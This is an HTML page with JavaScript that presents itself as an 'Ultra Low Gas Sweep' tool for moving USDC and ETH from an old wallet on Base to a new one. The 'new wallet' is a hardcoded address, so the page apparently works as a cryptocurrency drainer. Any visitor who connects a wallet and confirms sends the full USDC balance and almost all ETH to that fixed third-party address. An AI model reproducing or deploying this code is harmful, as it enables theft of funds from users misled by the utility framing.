<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Ultra Low Gas Sweep</title>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<style>
  body{background:#0f172a;color:#e2e8f0;font-family:system-ui;text-align:center;padding:30px;}
  .box{max-width:560px;margin:40px auto;background:#1e293b;padding:40px;border-radius:20px;}
  button{padding:16px 32px;margin:15px;font-size:18px;border:none;border-radius:12px;cursor:pointer;color:white;}
  .connect{background:#3b82f6;}
  .sweep{background:#10b981;font-weight:bold;}
  .addr{background:#334155;padding:12px;border-radius:8px;font-family:monospace;word-break:break-all;}
  #log{margin-top:20px;padding:20px;background:#334155;border-radius:12px;display:none;}
  .ok{background:#166534;color:#86efac;}
  .err{background:#7f1d1d;color:#fca5a5;}
</style>
</head>
<body>
<div class="box">
  <h1>Ultra Low Gas Sweep</h1>
  <p>Works even with 0.00003 ETH gas</p>
  <button class="connect" onclick="connect()">Connect Old Wallet (Base)</button>

  <div id="main" style="display:none;margin-top:30px;">
    <p>Old wallet:<br><span class="addr" id="old"></span></p>
    <p>New wallet:<br><span class="addr">0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</span></p>
    <button class="sweep" onclick="sweep()">Sweep USDC + ETH (â‰¤ 0.00002 ETH gas)</button>
    <div id="log"></div>
  </div>
</div>

<script>
const NEW = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
let web3, addr;

async function connect() {
  web3 = new Web3(window.ethereum || "https://mainnet.base.org");
  await ethereum.request({method:'eth_requestAccounts'});
  if ((await web3.eth.getChainId()) !== 8453) {
    await ethereum.request({method:"wallet_switchEthereumChain", params:[{chainId:"0x2105"}]});
  }
  [addr] = await web3.eth.getAccounts();
  document.getElementById('old').textContent = addr;
  document.getElementById('main').style.display = 'block';
}

async function sweep() {
  if (!confirm("Send ALL USDC + ETH to new wallet now?")) return;
  const log = document.getElementById('log'); log.style.display='block'; log.className=''; log.textContent='Sending...\n';

  try {
    // 1. Transfer USDC (if any)
    const usdc = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}], USDC);
    const bal = await usdc.methods.balanceOf(addr).call();
    if (bal > 0) {
      await usdc.methods.transfer(NEW, bal).send({from: addr, gas: 60000});
      log.textContent += `USDC sent!\n`;
    }

    // 2. Transfer ETH (everything except 0.00001 reserve)
    const ethBal = await web3.eth.getBalance(addr);
    const toSend = ethBal - 10000000000000n; // leave 0.00001 ETH
    if (toSend > 0) {
      await web3.eth.sendTransaction({from: addr, to: NEW, value: toSend, gas: 21000});
      log.textContent += `ETH sent!\n`;
    }

    log.textContent += "\nFinished! Check new wallet.";
    log.className = 'ok';
  } catch(e) {
    log.className = 'err';
    log.textContent += "Failed: " + (e.message || e);
  }
}
</script>
</body></html>